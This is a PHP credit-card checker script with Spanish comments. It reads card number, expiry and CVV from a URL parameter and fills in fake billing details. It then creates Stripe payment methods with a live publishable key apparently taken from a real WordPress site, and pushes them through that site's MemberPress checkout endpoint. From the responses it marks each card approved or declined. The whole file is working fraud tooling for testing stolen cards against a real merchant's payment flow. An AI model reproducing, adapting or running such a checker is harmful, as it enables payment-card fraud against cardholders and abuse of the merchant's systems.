<?php
error_reporting(0);

$get_Card = $_GET['lista'];
$cc = MultiExplode([":", "|", "⋙", " ", "/"], $get_Card)[0];
$mes = MultiExplode([":", "|", "⋙", " ", "/"], $get_Card)[1];
$ano = MultiExplode([":", "|", "⋙", " ", "/"], $get_Card)[2];
$cvv = MultiExplode([":", "|", "⋙", " ", "/"], $get_Card)[3];


#OBTENIENDO DATOS RANDOM [CREDITS TO: ZELTRAX]

$name = ucfirst(strtolower(str_shuffle("KingProOficial")));
$last = ucfirst(strtolower(str_shuffle("KingProOficial")));
$ext = ['@gmail.com', '@hotmail.com', '@yahoo.com'];
$ext_rand = array_rand($ext);
$email = $name.rand(100, 999999).$ext[$ext_rand];
$address = ''.rand(0000, 9999).'+Main+Street';
$phone = '515462'.rand(0000, 9999);
$st = ["AL","NY","CA","FL","WA"];
$st1 = array_rand($st);
$state = $st[$st1];
if ($state == "NY") {
    $zip = "10080";
    $city = "New+York";
} elseif ($state == "WA") {
    $zip = "98001";
    $city = "Auburn";
} elseif ($state == "AL") {
    $zip = "35005";
    $city = "Adamsville";
} elseif ($state == "FL") {
    $zip = "32003";
    $city = "Orange+Park";
} else {
    $zip = "90201";
    $city = "Bell";
}

$code = ['a50', 'a91', '1l0'];
$code_rnd = str_shuffle(array_rand($code));

#EMPIEZA EL PROCESO DE BINLOOKUP

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin = substr($cc, 0, 6));
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $add = curl_exec($ch);
    $card = getStr($add, '"scheme":"', '",');
    $type = getStr($add, '"type":"', '",');
    $brand = getStr($add, 'brand":"', '"');
    $prepaid = getStr($add, '"prepaid":', ',');
    $country = getStr($add, '","name":"', '","');
    $currency = getStr($add, '"currency":"', '",');
    $bank = getStr($add, '"bank":{"name":"', '",');
    $emoji = getStr($add, '"emoji":"', '",');

#EMPIEZA EL PROCESO DE CHEQUEO
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: api.stripe.com',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0',
    'Accept: application/json',
    'Content-Type: application/x-www-form-urlencoded',
    'Origin: https://js.stripe.com',
    'Referer: https://js.stripe.com/'
    ]);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_VERBOSE, 1);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][line1]='.$address.'&billing_details[address][city]='.$city.'&billing_details[address][country]=US&billing_details[address][state]='.$state.'&billing_details[address][postal_code]='.$zip.'&billing_details[name]='.$name.'+'.$last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F89c3b0729%3B+stripe-js-v3%2F89c3b0729&time_on_page=433435&referrer=https%3A%2F%2Fdaviesmediadesign.com%2F&key=pk_live_51FM2BCIyqnFDLXpsyQkjvfeocW5QYaraw3pKhj7y6DQ3yHLzxdgYxkM88XzdbYv2kYz2GtGuWqdhO1TLxrTaMp1b00LGGpuWDv');

    $result = curl_exec($ch);

    $token = trim(strip_tags(getStr($result, '"id": "', '"')));

    if (empty($result)) {
        $Resultado = ['Card' => $cc.'|'.$mes.'|'.$ano.'|'.$cvv, 'Status' => 'PROXY DEAD ❌', 'Bin' => $bin, 'Scheme'=> ucfirst($card), 'Tipo' => ucfirst($type), 'Brand' => $brand, 'Pais' => $country, 'Banco' => ucfirst(strtolower($bank)), 'Bandera' => $emoji, 'Currency' => $currency];
        Transform($Resultado);
        exit();
    }
    if (empty($token)) {
        $Resultado = ['Card' => $cc.'|'.$mes.'|'.$ano.'|'.$cvv, 'Status' => '1R Declined ❌', 'Bin' => $bin, 'Scheme'=> ucfirst($card), 'Tipo' => ucfirst($type), 'Brand' => $brand, 'Pais' => $country, 'Banco' => ucfirst(strtolower($bank)), 'Bandera' => $emoji, 'Currency' => $currency];
        Transform($Resultado);
        exit();
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://daviesmediadesign.com/wp-admin/admin-ajax.php');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: daviesmediadesign.com',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0',
    'Accept: application/json, text/javascript, */*; q=0.01',
    'cache-control: no-cache',
    'X-Requested-With: XMLHttpRequest',
    'Content-Type: multipart/form-data; boundary=---------------------------340352124739086239102977130518',
    'Origin: https://daviesmediadesign.com',
    'Referer: https://daviesmediadesign.com/register/premium/?action=checkout&txn=1a5'
    ]);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_VERBOSE, 1);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '-----------------------------340352124739086239102977130518
Content-Disposition: form-data; name="mepr_transaction_id"

2052
-----------------------------340352124739086239102977130518
Content-Disposition: form-data; name="address_required"

1
-----------------------------340352124739086239102977130518
Content-Disposition: form-data; name="card-address-one"

'.$address.'
-----------------------------340352124739086239102977130518
Content-Disposition: form-data; name="card-address-two"


-----------------------------340352124739086239102977130518
Content-Disposition: form-data; name="card-address-city"

'.$city.'
-----------------------------340352124739086239102977130518
Content-Disposition: form-data; name="card-address-country"

US
-----------------------------340352124739086239102977130518
Content-Disposition: form-data; name="card-address-state"

'.$state.'
-----------------------------340352124739086239102977130518
Content-Disposition: form-data; name="card-address-zip"

'.$zip.'
-----------------------------340352124739086239102977130518
Content-Disposition: form-data; name="card-name"

'.$name.' '.$last.'
-----------------------------340352124739086239102977130518
Content-Disposition: form-data; name="payment_method_id"

'.$token.'
-----------------------------340352124739086239102977130518
Content-Disposition: form-data; name="action"

mepr_stripe_confirm_payment
-----------------------------340352124739086239102977130518
Content-Disposition: form-data; name="mepr_current_url"

https://daviesmediadesign.com/register/premium/?action=checkout&txn='.$code_rnd.'#mepr_jump
-----------------------------340352124739086239102977130518--
');
    
    $result = curl_exec($ch);

    if (empty($result)) {
        $Resultado = ['Card' => $cc.'|'.$mes.'|'.$ano.'|'.$cvv, 'Status' => 'PROXY DEAD ❌', 'Bin' => $bin, 'Scheme'=> ucfirst($card), 'Tipo' => ucfirst($type), 'Brand' => $brand, 'Pais' => $country, 'Banco' => ucfirst(strtolower($bank)), 'Bandera' => $emoji, 'Currency' => $currency];
        Transform($Resultado);
        exit();
    }

    $error = trim(strip_tags(getStr($result, '"error":"', '"')));

    $subscription_id = trim(strip_tags(getStr($result, '"subscription_id":"', '"')));


#RESPONSES

    if (strpos($result, "Your card's security code is incorrect.")) {
        $Resultado = ['Card' => $cc.'|'.$mes.'|'.$ano.'|'.$cvv, 'Status' => 'CCN Approved!!✅', 'Bin' => $bin, 'Scheme'=> ucfirst($card), 'Tipo' => ucfirst($type), 'Brand' => $brand, 'Pais' => $country, 'Banco' => ucfirst(strtolower($bank)), 'Bandera' => $emoji, 'Currency' => $currency];
        Transform($Resultado);
    } elseif (!empty($subscription_id) && $error == 'Card payment failed, please try another payment method') {
        $Resultado = ['Card' => $cc.'|'.$mes.'|'.$ano.'|'.$cvv, 'Status' => 'CVV Approved!!✅', 'Bin' => $bin, 'Scheme'=> ucfirst($card), 'Tipo' => ucfirst($type), 'Brand' => $brand, 'Pais' => $country, 'Banco' => ucfirst(strtolower($bank)), 'Bandera' => $emoji, 'Currency' => $currency];
        Transform($Resultado);
    } else {
        $Resultado = ['Card' => $cc.'|'.$mes.'|'.$ano.'|'.$cvv, 'Status' => 'Declined ❌', 'Bin' => $bin, 'Scheme'=> ucfirst($card), 'Tipo' => ucfirst($type), 'Brand' => $brand, 'Pais' => $country, 'Banco' => ucfirst(strtolower($bank)), 'Bandera' => $emoji, 'Currency' => $currency];
        Transform($Resultado);
    }


#FUNCIONES REQUERIDAS

    function getStr($string, $start, $end)
    {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

    function MultiExplode($delimiters, $string)
    {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }

    function Transform($Resultado)
    {
        foreach ($Resultado as $key => $value) {
            $Resultado[$key] = $value.'.';
        }
        print_r($Resultado);
    }
